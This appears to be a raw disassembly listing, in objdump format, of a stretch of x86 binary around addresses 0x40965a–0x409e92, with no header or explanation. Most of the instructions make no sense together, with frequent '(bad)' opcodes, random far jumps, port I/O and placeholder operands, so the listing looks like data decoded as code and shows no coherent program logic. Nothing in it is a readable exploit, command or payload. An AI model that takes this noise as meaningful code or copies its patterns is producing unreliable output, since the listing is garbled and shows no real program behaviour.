  40965a:	xor    dh,BYTE PTR [esi-0x18]
  40965d:	xchg   ebx,eax
  40965e:	rol    DWORD PTR [ecx],cl
  409660:	pop    edi
  409661:	or     edx,DWORD PTR [ecx]
  409663:	add    DWORD PTR [eax],edx
  409665:	dec    ebp
  409666:	rcl    ah,1
  409668:	(bad)  
  409669:	repnz cdq 
  40966b:	mov    bl,BYTE PTR gs:[bx+si]
  40966f:	xchg   edx,eax
  409670:	fcomp  st(3)
  409672:	push   ebp
  409673:	dec    ebx
  409674:	pop    ebp
  409675:	dec    esp
  409676:	pop    ds
  409677:	mov    eax,ds:0xc051e0d1
  40967c:	pop    eax
  40967d:	dec    eax
  40967e:	rcl    BYTE PTR [edx-0x698b2c64],0x43
  409685:	aad    0x7
  409687:	mov    BYTE PTR [eax-0x2c9d8e7c],ah
  40968d:	pop    edi
  40968e:	or     al,0x1a
  409690:	mov    ch,0x14
  409692:	ja     0x4096f9
  409694:	sahf   
  409695:	test   al,0x6f
  409697:	arpl   WORD PTR [edi],sp
  409699:	xchg   al,bh
  40969b:	mov    DWORD PTR ss:[esi+0x20],eax
  40969f:	add    ebp,DWORD PTR [eax-0x41135cfd]
  4096a5:	ins    BYTE PTR es:[edi],dx
  4096a6:	inc    edx
  4096a7:	push   edx
  4096a8:	jb     0x409698
  4096aa:	dec    ebx
  4096ab:	enter  0x32fb,0xda
  4096af:	push   esp
  4096b0:	sbb    al,0x26
  4096b2:	out    0x7a,eax
  4096b4:	mov    esi,0x4c48f138
  4096b9:	push   cs
  4096ba:	and    dl,BYTE PTR [eax-0x389635b5]
  4096c0:	mov    ds:0xdaace439,eax
  4096c5:	push   ss
  4096c6:	sbb    cl,BYTE PTR [edx]
  4096c8:	pop    ebp
  4096c9:	xor    esi,ecx
  4096cb:	lock lods al,BYTE PTR ds:[esi]
  4096cd:	cli    
  4096ce:	jnp    0x409667
  4096d0:	sbb    eax,0x9fd83e1f
  4096d5:	pop    esp
  4096d6:	pop    edi
  4096d7:	int3   
  4096d8:	or     DWORD PTR gs:[ebx+0x2a],ecx
  4096dc:	gs pop edx
  4096de:	outs   dx,BYTE PTR ds:[esi]
  4096df:	xchg   ebx,eax
  4096e0:	fwait
  4096e1:	push   ss
  4096e2:	jns    0x409687
  4096e4:	jg     0x409730
  4096e6:	xor    ch,BYTE PTR [ebp+0xc]
  4096e9:	int3   
  4096ea:	shl    BYTE PTR [eax+0x8],1
  4096ed:	cwde   
  4096ee:	jg     0x4096f7
  4096f0:	sub    eax,0x9d1eed31
  4096f5:	outs   dx,DWORD PTR ds:[esi]
  4096f6:	repnz (bad) 
  4096f8:	mov    al,0xcd
  4096fa:	popa   
  4096fb:	test   eax,0x83af6502
  409700:	aaa    
  409701:	fiadd  DWORD PTR [edx+0x69]
  409704:	jecxz  0x4096d9
  409706:	push   es
  409707:	or     DWORD PTR [edi],0x2a
  40970a:	and    al,0xcc
  40970c:	imul   DWORD PTR [ecx-0x28ac6424]
  409712:	inc    ebx
  409713:	pop    ds
  409714:	imul   edi,DWORD PTR [eax+esi*2],0xfffffffb
  409718:	inc    ecx
  409719:	addr16 icebp 
  40971b:	inc    ecx
  40971c:	jne    0x40978c
  40971e:	sbb    edi,DWORD PTR [edi]
  409720:	mov    fs,eax
  409722:	dec    edx
  409723:	ins    DWORD PTR es:[edi],dx
  409724:	push   0x772dafab
  409729:	cmp    bl,BYTE PTR [eax]
  40972b:	(bad)  
  40972c:	sbb    dh,BYTE PTR [eax+0x3086c4c8]
  409732:	add    BYTE PTR ds:0xcb2e91af,0x9
  409739:	lods   al,BYTE PTR ds:[esi]
  40973a:	test   dl,bh
  40973c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40973d:	sbb    dh,bh
  40973f:	sub    edi,DWORD PTR [edi+ebp*8+0x394b1e0b]
  409746:	and    dl,BYTE PTR [ecx]
  409748:	add    al,0x7
  40974a:	out    0x96,al
  40974c:	jnp    0x409720
  40974e:	lock mov ebp,0xa0d597b1
  409754:	lea    edx,[edi-0x4b702f76]
  40975a:	pop    edi
  40975b:	ins    DWORD PTR es:[edi],dx
  40975c:	mov    WORD PTR [edi+0x10d974bd],gs
  409762:	sbb    BYTE PTR [eax+eiz*4+0x47],0xca
  409767:	imul   esp,DWORD PTR [ebx+0x657ecaa8],0x4
  40976e:	outs   dx,BYTE PTR ds:[esi]
  40976f:	cli    
  409770:	(bad)  
  409771:	js     0x4097c4
  409773:	push   ds
  409774:	xor    eax,0x2bf60bd
  409779:	sahf   
  40977a:	xor    DWORD PTR [esi],edi
  40977c:	mov    dh,0x9e
  40977e:	out    0x58,eax
  409780:	adc    eax,0x411f715e
  409785:	out    0x1f,al
  409787:	test   al,0x1c
  409789:	sar    DWORD PTR [edi],1
  40978b:	mov    dl,BYTE PTR [edx-0x5d4c53c1]
  409791:	out    0x5f,al
  409793:	nop
  409794:	push   edx
  409795:	jmp    0x6f96:0x5c7b813c
  40979c:	loope  0x4097dc
  40979e:	ficomp WORD PTR [eax+0x19ddeecf]
  4097a4:	jmp    0x8d8:0xe41e6aef
  4097ab:	mov    dl,0x39
  4097ad:	jnp    0x40975b
  4097af:	pop    ebp
  4097b0:	lods   eax,DWORD PTR ds:[esi]
  4097b1:	mov    BYTE PTR ss:[edx-0x68],bh
  4097b5:	in     eax,dx
  4097b6:	mov    esp,0xbb848110
  4097bb:	lods   al,BYTE PTR ds:[esi]
  4097bc:	xchg   esi,eax
  4097bd:	mov    ebx,0xb616daf8
  4097c3:	sub    al,ch
  4097c5:	push   edx
  4097c6:	cwde   
  4097c7:	mov    WORD PTR fs:[ebx],?
  4097ca:	aam    0x25
  4097cc:	add    dl,al
  4097ce:	adc    eax,0x5a88a439
  4097d3:	cld    
  4097d4:	jo     0x4097da
  4097d6:	jmp    0xdc0a:0xfc3502df
  4097dd:	fsubr  QWORD PTR [ecx+0x6a4c9e46]
  4097e3:	mov    edx,0x9f3d65cb
  4097e8:	and    ebp,edx
  4097ea:	xchg   BYTE PTR [di],bh
  4097ed:	mov    WORD PTR [esi+0x2ead680f],es
  4097f3:	cli    
  4097f4:	cmp    BYTE PTR [ecx+0x524e60ef],bh
  4097fa:	cmp    al,0xaf
  4097fc:	(bad)  
  4097fd:	mov    ah,0x38
  4097ff:	push   0x5457ca80
  409804:	xchg   esi,eax
  409805:	pop    ds
  409806:	sbb    BYTE PTR [esi],0x4a
  409809:	adc    al,ah
  40980b:	mov    dl,0x36
  40980d:	das    
  40980e:	cld    
  40980f:	jecxz  0x40985b
  409811:	scas   eax,DWORD PTR es:[edi]
  409812:	dec    edx
  409813:	adc    eax,0xc24c7e15
  409818:	clc    
  409819:	popa   
  40981a:	inc    edi
  40981b:	xor    DWORD PTR [eax-0x4e],ebx
  40981e:	imul   ebp,esi,0x856c5007
  409824:	popf   
  409825:	cmp    al,0x20
  409827:	adc    bh,BYTE PTR [eax+0x1d]
  40982a:	in     al,dx
  40982b:	cmp    DWORD PTR [edx],ebx
  40982d:	loopne 0x4097e7
  40982f:	cmp    DWORD PTR [esi-0x48],eax
  409832:	inc    esi
  409833:	inc    ebx
  409834:	fsub   DWORD PTR [eax]
  409836:	push   ebx
  409837:	cmp    eax,0xea45758b
  40983c:	stc    
  40983d:	repz adc ecx,ecx
  409840:	push   esi
  409841:	out    0xfe,eax
  409843:	bound  ecx,QWORD PTR [ecx+edi*1+0x5a2bb1cc]
  40984a:	outs   dx,BYTE PTR ds:[esi]
  40984b:	rcl    DWORD PTR [esi],cl
  40984d:	or     cl,BYTE PTR ds:0xce51ee44
  409853:	mov    dl,0x55
  409855:	call   0x4197:0xa667ce88
  40985c:	mov    es,WORD PTR [ebx+0x4321cda1]
  409862:	sub    al,0x1
  409864:	xrelease xchg BYTE PTR [edi-0x18],dl
  409868:	test   al,0x69
  40986a:	sti    
  40986b:	rcl    BYTE PTR [edi+0x61],1
  40986e:	add    eax,0xf8a55356
  409873:	in     al,dx
  409874:	call   0xd429:0x4330b4d
  40987b:	inc    ebx
  40987c:	mov    esp,0x6c530eac
  409881:	popa   
  409882:	push   es
  409883:	imul   ebx,DWORD PTR [ecx-0x53],0x1424035b
  40988a:	(bad)  [ebp+0x5d]
  40988d:	cmp    al,0x6
  40988f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409890:	idiv   DWORD PTR ds:0x8fded2ce
  409896:	pop    ebp
  409897:	mov    al,0xe6
  409899:	aam    0x45
  40989b:	jb     0x40990a
  40989d:	lods   al,BYTE PTR ds:[esi]
  40989e:	(bad)  
  4098a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098a1:	or     dh,BYTE PTR [edi+0x379d5d2b]
  4098a7:	lock cwde 
  4098a9:	stc    
  4098aa:	mov    cs,edx
  4098ac:	mov    ebp,0x58483261
  4098b1:	jl     0x40985c
  4098b3:	pop    ds
  4098b4:	adc    al,0xe
  4098b6:	sub    BYTE PTR [esi-0x219f88bf],cl
  4098bc:	nop
  4098bd:	pop    edx
  4098be:	xchg   ecx,eax
  4098bf:	mov    ah,0x65
  4098c1:	dec    ebx
  4098c2:	sub    bh,0xfd
  4098c5:	or     bh,BYTE PTR [ecx+0x274f3ce7]
  4098cb:	sub    ch,BYTE PTR [edx+0x411fe821]
  4098d1:	shl    BYTE PTR [eax-0x7],cl
  4098d4:	and    bh,bh
  4098d6:	jne    0x4098c3
  4098d8:	mov    ecx,0x9d566336
  4098dd:	lods   al,BYTE PTR ds:[esi]
  4098de:	mov    cl,0x45
  4098e0:	mov    ah,al
  4098e2:	push   ds
  4098e3:	inc    ebp
  4098e4:	push   cs
  4098e5:	cdq    
  4098e6:	push   edi
  4098e7:	in     eax,0x79
  4098e9:	sub    al,0xf9
  4098eb:	scas   eax,DWORD PTR es:[edi]
  4098ec:	jge    0x40988e
  4098ee:	ret    
  4098ef:	dec    ecx
  4098f0:	xchg   DWORD PTR [ecx+0x130b4404],ecx
  4098f6:	mov    ebp,0x2183d899
  4098fb:	add    DWORD PTR [edx],esi
  4098fd:	add    ch,dl
  4098ff:	test   eax,0xc6768159
  409904:	lds    ebx,FWORD PTR [eax]
  409906:	jbe    0x4098fa
  409908:	push   0x1b2f6c07
  40990d:	add    al,0x6f
  40990f:	ret    0x2f84
  409912:	sub    dl,bl
  409914:	dec    esp
  409915:	add    edi,DWORD PTR [edx]
  409917:	pop    ebx
  409918:	xchg   edi,eax
  409919:	lods   eax,DWORD PTR ds:[esi]
  40991a:	fist   DWORD PTR [ebp+0x13]
  40991d:	push   es
  40991e:	mov    edx,0xfdc2beb9
  409923:	loopne 0x40995a
  409925:	cwde   
  409926:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409927:	mov    edi,0xf8f0d1c8
  40992c:	xchg   edx,eax
  40992d:	and    eax,0x55dc3b22
  409932:	jo     0x4098c6
  409934:	dec    esi
  409935:	fild   QWORD PTR [esi]
  409937:	jmp    0x4099ab
  409939:	rcl    DWORD PTR ds:0xc1f15cf4,0x37
  409940:	hlt    
  409941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409942:	jb     0x4099aa
  409944:	cmp    eax,DWORD PTR [ebx+0x7b]
  409947:	jmp    0xcb67:0x71024a50
  40994e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40994f:	in     al,0xe6
  409951:	repnz sbb DWORD PTR [edx+0x42f33b2a],esi
  409958:	mov    ah,0xb2
  40995a:	sti    
  40995b:	push   esp
  40995c:	pop    edx
  40995d:	pop    edi
  40995e:	out    dx,al
  40995f:	scas   eax,DWORD PTR es:[edi]
  409960:	xor    BYTE PTR [edi+0x74],cl
  409963:	push   0x1d
  409965:	(bad)  
  409966:	cdq    
  409967:	dec    ecx
  409968:	pop    ds
  409969:	xor    ecx,DWORD PTR [edi-0x47]
  40996c:	mov    al,bl
  40996e:	jmp    0x4098fd
  409970:	sar    ah,0x2f
  409973:	cmp    dh,BYTE PTR [ecx-0x5d]
  409976:	adc    al,0x84
  409978:	sub    BYTE PTR [edi-0x71],ch
  40997b:	sti    
  40997c:	shl    DWORD PTR [ecx-0x1f6516bb],1
  409982:	sbb    eax,0xa1da7096
  409987:	cmovp  ecx,DWORD PTR [edx+0xb]
  40998b:	add    DWORD PTR [ebp-0xedeb1dc],0x20
  409992:	in     al,dx
  409993:	ss inc esp
  409995:	mov    ds:0x6eaef464,eax
  40999a:	shl    BYTE PTR [edi+0xf5aeaba],1
  4099a0:	outs   dx,DWORD PTR ds:[esi]
  4099a1:	jo     0x409951
  4099a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099a4:	int3   
  4099a5:	push   ss
  4099a6:	add    al,0xbf
  4099a8:	pusha  
  4099a9:	test   BYTE PTR [edx],bl
  4099ab:	mov    eax,ebx
  4099ad:	or     al,BYTE PTR [edi]
  4099af:	addr16 stc 
  4099b1:	inc    edx
  4099b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099b3:	repnz imul eax,DWORD PTR [edi+0x6a],0x3745338f
  4099bb:	dec    esp
  4099bc:	mov    al,ds:0x6af83d51
  4099c1:	add    ch,ah
  4099c3:	mov    ss,WORD PTR [ecx-0x3d]
  4099c6:	fcomp  DWORD PTR [esi]
  4099c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099c9:	dec    edx
  4099ca:	sub    BYTE PTR [eax],bl
  4099cc:	jg     0x4099ea
  4099ce:	pop    ebx
  4099cf:	call   0x79de:0x9f25f6c6
  4099d6:	leave  
  4099d7:	aas    
  4099d8:	adc    DWORD PTR [edx-0x32015c81],0x4a
  4099df:	xor    bl,BYTE PTR [ebp+0x1a]
  4099e2:	(bad)  [ebp+0x77]
  4099e5:	test   eax,0xbdae6233
  4099ea:	add    al,0xab
  4099ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099ed:	inc    ebp
  4099ee:	jle    0x4099f1
  4099f0:	mov    al,BYTE PTR [edx+0x490ef1a]
  4099f6:	je     0x409a2c
  4099f8:	inc    BYTE PTR [eax]
  4099fa:	out    dx,al
  4099fb:	push   0x15c9bc7e
  409a00:	rcl    DWORD PTR [ebx-0x2f],1
  409a03:	adc    eax,DWORD PTR [edi]
  409a05:	stos   BYTE PTR es:[edi],al
  409a06:	ror    DWORD PTR [edi+0x39],0xa9
  409a0a:	jne    0x4099c6
  409a0c:	adc    esp,DWORD PTR [edx+0x7f]
  409a0f:	mov    ecx,0xf456e891
  409a14:	(bad)  
  409a15:	mov    ecx,0x23408ac9
  409a1a:	push   esi
  409a1b:	shr    BYTE PTR [ecx+0x51067124],cl
  409a21:	push   es
  409a22:	ds jne 0x409a9b
  409a25:	hlt    
  409a26:	ret    
  409a27:	jb     0x409a78
  409a29:	mov    ah,0xb3
  409a2b:	ins    BYTE PTR es:[edi],dx
  409a2c:	mov    WORD PTR [esi+ecx*2+0x31],ss
  409a30:	sbb    al,0xf5
  409a32:	mov    ds:0x7290d2f4,eax
  409a37:	cmp    BYTE PTR [ebx-0x5ea0ca7f],bl
  409a3d:	daa    
  409a3e:	ja     0x409a8f
  409a40:	rol    BYTE PTR [ebx-0x4a],0xad
  409a44:	mov    dh,BYTE PTR [ebx+0x19375ba8]
  409a4a:	(bad)  
  409a4b:	loope  0x409a3c
  409a4d:	test   eax,0x847dee0e
  409a52:	hlt    
  409a53:	popa   
  409a54:	outs   dx,DWORD PTR ds:[esi]
  409a55:	mov    esi,ecx
  409a57:	cmp    eax,DWORD PTR [ecx-0x2725f79b]
  409a5d:	(bad)  
  409a5e:	mov    ds:0x971b3c77,al
  409a63:	out    0x3c,eax
  409a65:	xor    eax,0x3dcfe49b
  409a6a:	ds pop ds
  409a6c:	fldenv [ebx+eax*8+0x72]
  409a70:	fmulp  st(1),st
  409a72:	xchg   BYTE PTR [esi],bh
  409a74:	xor    al,0xb9
  409a76:	rol    DWORD PTR [edi-0x3c],cl
  409a79:	fmul   st,st(4)
  409a7b:	jns    0x409a8a
  409a7d:	das    
  409a7e:	push   edi
  409a7f:	mov    eax,DWORD PTR gs:[esi+eax*1+0x3b71cf84]
  409a87:	mov    WORD PTR [ebp+0x627acca8],?
  409a8d:	aas    
  409a8e:	(bad)  
  409a8f:	pop    edx
  409a90:	iret   
  409a91:	inc    edi
  409a92:	rol    BYTE PTR [esi+esi*1-0x62],1
  409a96:	out    0x82,al
  409a98:	sbb    al,BYTE PTR [ebx-0x6f]
  409a9b:	mov    ebx,0x5a969b70
  409aa0:	test   al,0x4d
  409aa2:	adc    al,0x90
  409aa4:	pop    eax
  409aa5:	mov    ch,BYTE PTR [ebp-0x6e]
  409aa8:	and    ebx,ebp
  409aaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409aab:	add    bl,bh
  409aad:	(bad)  
  409aae:	jns    0x409a3c
  409ab0:	jl     0x409af6
  409ab2:	sub    BYTE PTR [ebx],ch
  409ab4:	aas    
  409ab5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ab6:	jle    0x409ad6
  409ab8:	xor    esi,DWORD PTR [edi+0x5f]
  409abb:	add    bl,bl
  409abd:	xchg   ebp,eax
  409abe:	and    DWORD PTR [edx+0x69],ecx
  409ac1:	enter  0xf481,0x88
  409ac5:	das    
  409ac6:	lahf   
  409ac7:	test   eax,0x542f0d9f
  409acc:	lds    edx,FWORD PTR [edi-0x112c9c21]
  409ad2:	mov    ecx,0xad6339a9
  409ad7:	mov    esp,0xbeb77cdb
  409adc:	push   ebx
  409add:	stc    
  409ade:	loopne 0x409b50
  409ae0:	lods   al,BYTE PTR ds:[esi]
  409ae1:	enter  0x4ebb,0xa1
  409ae5:	sbb    eax,0x26c39b61
  409aea:	push   edx
  409aeb:	fisttp QWORD PTR [edx-0x2c]
  409aee:	jnp    0x409b64
  409af0:	mov    bl,0x16
  409af2:	jg     0x409a93
  409af4:	jmp    0x4a00c2cc
  409af9:	ja     0x409b2d
  409afb:	cmp    DWORD PTR ds:0xb6ae6d3e,ebx
  409b01:	popf   
  409b02:	(bad)  
  409b03:	or     ebp,DWORD PTR [edi]
  409b05:	es retf 0x3d1d
  409b09:	jmp    0x172e:0x87e06084
  409b10:	ror    DWORD PTR [esi+eiz*2+0x3c],0x7f
  409b15:	inc    edx
  409b16:	pusha  
  409b17:	jb     0x409b05
  409b19:	xchg   esi,eax
  409b1a:	or     BYTE PTR [ecx-0x46],0x31
  409b1e:	mov    edi,0xc8428319
  409b23:	imul   ecx,DWORD PTR [esi-0x65],0x9614e8f5
  409b2a:	sub    ecx,edx
  409b2c:	push   0xffffff9f
  409b2e:	push   es
  409b2f:	scas   al,BYTE PTR es:[edi]
  409b30:	and    cl,BYTE PTR [ebx]
  409b32:	push   edx
  409b33:	in     al,0x9b
  409b35:	call   0xe63e:0x12c83768
  409b3c:	dec    esi
  409b3d:	nop
  409b3e:	cmp    ecx,DWORD PTR [ecx+0x6a]
  409b41:	add    DWORD PTR [esi],eax
  409b43:	cdq    
  409b44:	scas   eax,DWORD PTR es:[edi]
  409b45:	xchg   ebp,eax
  409b46:	jb     0x409b40
  409b48:	std    
  409b49:	out    dx,al
  409b4a:	(bad)  
  409b4b:	dec    ebx
  409b4c:	mov    ecx,0xfda00c5d
  409b51:	cld    
  409b52:	stos   DWORD PTR es:[edi],eax
  409b53:	push   cs
  409b54:	and    BYTE PTR [esi+edx*1-0x1d8ff0ab],dl
  409b5b:	push   ebx
  409b5c:	add    al,0xb7
  409b5e:	adc    WORD PTR [esi+eax*1-0x13],sp
  409b63:	rol    DWORD PTR [edx-0x39],0x39
  409b67:	sbb    esp,0x985edb52
  409b6d:	dec    ecx
  409b6e:	lods   eax,DWORD PTR ds:[esi]
  409b6f:	xor    esi,DWORD PTR [edx]
  409b71:	jns    0x409b75
  409b73:	std    
  409b74:	test   eax,0xe43d4891
  409b79:	mov    cs,WORD PTR ds:0x8556b64b
  409b7f:	push   ecx
  409b80:	push   esp
  409b81:	or     ah,BYTE PTR [ecx+0x402ba67e]
  409b87:	dec    ebx
  409b88:	dec    ecx
  409b89:	and    ah,BYTE PTR [esi+0x34]
  409b8c:	xchg   ecx,eax
  409b8d:	or     bl,BYTE PTR [ebx]
  409b8f:	and    al,0x31
  409b92:	mov    esi,0x8bab93f9
  409b97:	fmul   QWORD PTR [edi+0x1a]
  409b9a:	dec    ebp
  409b9b:	dec    eax
  409b9c:	(bad)  
  409b9d:	fisttp QWORD PTR [ebp-0x6d]
  409ba0:	mov    edi,0x6ebe84e5
  409ba5:	mov    al,ds:0xb818fac7
  409baa:	outs   dx,DWORD PTR ds:[esi]
  409bab:	mov    ds:0xd6059d36,eax
  409bb0:	retf   0xa307
  409bb3:	and    dl,BYTE PTR [ecx+ecx*4+0x67]
  409bb7:	sbb    BYTE PTR [eax-0x799cccee],al
  409bbd:	imul   ebx,DWORD PTR [eax-0x7b11cd0b],0x8c8150d6
  409bc7:	mov    edi,0x98cc72f6
  409bcc:	dec    esp
  409bcd:	fs call 0xba8b1b34
  409bd3:	mov    ebx,0x61a22d3f
  409bd8:	inc    ebp
  409bd9:	xor    al,0x60
  409bdb:	and    BYTE PTR [edx+ebp*8+0x7f],ch
  409bdf:	or     ebp,edx
  409be1:	mov    ch,bl
  409be3:	push   eax
  409be4:	xor    ecx,DWORD PTR [eax+edx*8+0x3f]
  409be8:	das    
  409be9:	xchg   edx,eax
  409bea:	sub    ah,ah
  409bec:	push   0x3a
  409bee:	daa    
  409bef:	push   edx
  409bf0:	fimul  WORD PTR ds:0xd6601732
  409bf6:	xor    edx,DWORD PTR [esi+ecx*1-0x23bda335]
  409bfd:	mov    WORD PTR [ebx-0xb062796],cs
  409c03:	pop    ds
  409c04:	push   esp
  409c05:	es jge 0x409c16
  409c08:	test   eax,0x1dadcba
  409c0d:	cdq    
  409c0e:	pop    ebx
  409c0f:	stos   BYTE PTR es:[edi],al
  409c10:	call   0xe4b3:0x7e004c6a
  409c17:	retf   
  409c18:	call   0xc223:0x6b442c63
  409c1f:	add    DWORD PTR [eax-0x4e],ecx
  409c22:	mov    BYTE PTR [eax-0xe],bl
  409c25:	jb     0x409bef
  409c27:	xor    eax,0xe4a88250
  409c2c:	cmp    BYTE PTR [esp+ecx*1-0x753537d],dl
  409c33:	add    BYTE PTR [eax-0x9],dl
  409c36:	xchg   esp,eax
  409c37:	cmp    eax,DWORD PTR [edx+0xf]
  409c3a:	inc    esi
  409c3b:	es popa 
  409c3d:	test   eax,0x5747060f
  409c42:	mov    bh,0x9f
  409c44:	pop    ds
  409c45:	sbb    al,0xfb
  409c47:	xchg   edi,eax
  409c48:	outs   dx,BYTE PTR ds:[esi]
  409c49:	dec    edi
  409c4a:	cmp    edx,DWORD PTR [esi+0x32b00c9b]
  409c50:	dec    ebx
  409c51:	cs aas 
  409c53:	ja     0x409c21
  409c55:	mov    ebx,0x3edb1e2f
  409c5a:	neg    ebp
  409c5c:	shr    BYTE PTR ds:0xc52ead00,1
  409c62:	outs   dx,BYTE PTR ds:[esi]
  409c63:	mov    WORD PTR [esi],ds
  409c65:	inc    ebp
  409c66:	es sub ecx,ebx
  409c69:	push   DWORD PTR [edi+0x4d]
  409c6c:	mov    ss,WORD PTR [edx+ebp*8-0x44]
  409c70:	mov    DWORD PTR [edi+0x3afe86c8],0x185ed01f
  409c7a:	and    al,0xa
  409c7c:	popa   
  409c7d:	inc    edx
  409c7e:	xor    al,bl
  409c80:	fild   WORD PTR [ebp+0x2b]
  409c83:	jp     0x409c8d
  409c85:	fstp   QWORD PTR [edi-0x4837860]
  409c8b:	xchg   edx,eax
  409c8c:	les    ebx,FWORD PTR [ebx+0x2f]
  409c8f:	and    BYTE PTR [ecx+0x19],ah
  409c92:	pop    ebx
  409c93:	out    0x8b,al
  409c95:	jbe    0x409c37
  409c97:	mov    bl,0x0
	...
  409d11:	add    BYTE PTR [eax],al
  409d13:	add    BYTE PTR [ebx],dl
  409d15:	or     eax,0xf7be76a8
  409d1a:	fild   QWORD PTR [ebp-0x8]
  409d1d:	out    0xa8,al
  409d1f:	repz dec edi
  409d21:	jl     0x409d10
  409d23:	jae    0x409d0e
  409d25:	dec    edi
  409d26:	add    BYTE PTR [eax],al
  409d28:	ins    BYTE PTR es:[edi],dx
  409d29:	pop    es
  409d2a:	add    BYTE PTR [eax],al
  409d2c:	inc    esi
  409d2d:	or     eax,0x12af25c7
  409d32:	int    0x43
  409d34:	or     ah,BYTE PTR [esi]
  409d36:	loop   0x409d1c
  409d38:	leave  
  409d39:	daa    
  409d3a:	dec    ebp
  409d3b:	xchg   ecx,eax
  409d3c:	dec    ecx
  409d3d:	sub    DWORD PTR ss:[ebx+0x423520ad],ecx
  409d44:	jg     0x409db7
  409d46:	int3   
  409d47:	mov    esp,0x38302556
  409d4c:	mov    ch,BYTE PTR [esi-0x12]
  409d4f:	pop    eax
  409d50:	and    DWORD PTR [ebx+0x65],edi
  409d53:	push   0xda941ce2
  409d58:	add    BYTE PTR [esi-0x6d],al
  409d5b:	pop    es
  409d5c:	dec    ecx
  409d5d:	lahf   
  409d5e:	stos   BYTE PTR es:[edi],al
  409d5f:	mov    ecx,0xe479f138
  409d64:	mov    ecx,0x5bda6139
  409d69:	cmp    DWORD PTR ds:0xa2dbe694,0xffffff90
  409d70:	test   ebp,edx
  409d72:	mov    al,ds:0x386d830a
  409d77:	jae    0x409df5
  409d79:	out    0xff,al
  409d7b:	ret    
  409d7c:	mov    ecx,0x546a0f4d
  409d81:	aad    0x4c
  409d83:	xchg   ebx,eax
  409d84:	retf   
  409d85:	stc    
  409d86:	xchg   ebx,eax
  409d87:	mov    dh,cl
  409d89:	outs   dx,BYTE PTR ds:[esi]
  409d8a:	cmp    DWORD PTR [edx+0x4ee679cc],esi
  409d90:	out    0xa6,eax
  409d92:	addr16 loop 0x409e02
  409d95:	mov    ah,0xd
  409d97:	lods   eax,DWORD PTR ds:[esi]
  409d98:	cld    
  409d99:	dec    esi
  409d9a:	neg    cl
  409d9c:	mul    dl
  409d9e:	inc    edx
  409d9f:	(bad)  
  409da0:	adc    cl,BYTE PTR [ecx]
  409da2:	push   edi
  409da3:	loope  0x409e0a
  409da5:	repnz hlt 
  409da7:	push   esi
  409da8:	and    DWORD PTR ds:0xd7374fea,ebp
  409dae:	mov    al,0xda
  409db0:	mov    bh,0x3e
  409db2:	neg    edx
  409db4:	loop   0x409de1
  409db6:	xchg   ebp,eax
  409db7:	outs   dx,BYTE PTR ds:[esi]
  409db8:	mov    ebp,0x9ad8108a
  409dbd:	jle    0x409d91
  409dbf:	cli    
  409dc0:	aam    0x43
  409dc2:	xchg   BYTE PTR [ecx-0x66],ch
  409dc5:	jl     0x409dee
  409dc7:	jne    0x409e03
  409dc9:	clc    
  409dca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dcb:	mov    ds:0x40bced14,al
  409dd0:	or     esp,DWORD PTR [eax+0x29034a0e]
  409dd6:	rol    BYTE PTR ds:0x191b3a2b,cl
  409ddc:	mov    dh,0x6f
  409dde:	rol    BYTE PTR [ebx+0xf],1
  409de1:	push   ds
  409de2:	xlat   BYTE PTR ds:[ebx]
  409de3:	not    BYTE PTR [eax+0x459f6eb]
  409de9:	ror    bh,1
  409deb:	jb     0x409db2
  409ded:	stos   BYTE PTR es:[edi],al
  409dee:	in     al,0xbd
  409df0:	es (bad) 
  409df2:	loopne 0x409dc5
  409df4:	pop    ecx
  409df5:	ja     0x409dcc
  409df7:	push   ds
  409df8:	scas   eax,DWORD PTR es:[edi]
  409df9:	pop    esp
  409dfa:	inc    eax
  409dfb:	sbb    bh,ah
  409dfd:	fsub   QWORD PTR [edi-0xed03be3]
  409e03:	sbb    eax,0x8a55dd69
  409e08:	retf   0x8640
  409e0b:	out    0x35,al
  409e0d:	lods   eax,DWORD PTR ds:[esi]
  409e0e:	mov    eax,0x446a56b6
  409e13:	pop    edx
  409e14:	add    BYTE PTR [eax],0x8e
  409e17:	js     0x409e60
  409e19:	xchg   ebp,eax
  409e1a:	loopne 0x409dda
  409e1c:	sar    DWORD PTR [ebp-0x62082b5b],cl
  409e22:	(bad)  [edi-0x3f]
  409e25:	xchg   ebp,eax
  409e26:	test   al,0xf
  409e28:	rcl    BYTE PTR ds:0xd0a7678b,1
  409e2e:	mov    esi,0x336a8051
  409e33:	loopne 0x409e63
  409e35:	sub    ebp,0x58
  409e38:	or     eax,0x39f6abf2
  409e3d:	jns    0x409e8a
  409e3f:	jmp    0x191d4591
  409e44:	add    dl,BYTE PTR [edx+0x798d3029]
  409e4a:	jbe    0x409de4
  409e4c:	sar    ah,0xf
  409e4f:	mov    edx,0x6a2a5f09
  409e54:	sub    ecx,esi
  409e56:	and    BYTE PTR [ebx-0x2b],bh
  409e59:	fistp  WORD PTR [eax+0xba64dd4]
  409e5f:	ja     0x409e5c
  409e61:	xchg   BYTE PTR [edi],al
  409e63:	leave  
  409e64:	loopne 0x409e25
  409e66:	xor    bl,BYTE PTR [edx+0x77]
  409e69:	aam    0x29
  409e6b:	xlat   BYTE PTR ds:[ebx]
  409e6c:	mov    ebx,0xa804b67a
  409e71:	jb     0x409e5f
  409e73:	sub    al,dh
  409e75:	jae    0x409e4f
  409e77:	pop    eax
  409e78:	dec    edx
  409e79:	push   ecx
  409e7a:	mov    ds:0xb4d12762,al
  409e7f:	push   cs
  409e80:	fld    TBYTE PTR [edi]
  409e82:	icebp  
  409e83:	cmp    esp,esp
  409e85:	pop    ebp
  409e86:	push   ebp
  409e87:	mov    ebp,0x3bdffe3e
  409e8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e8d:	xchg   BYTE PTR [eax-0x78],ch
  409e90:	sti    
  409e91:	cmc    
  409e92:	jno    0x409ebf
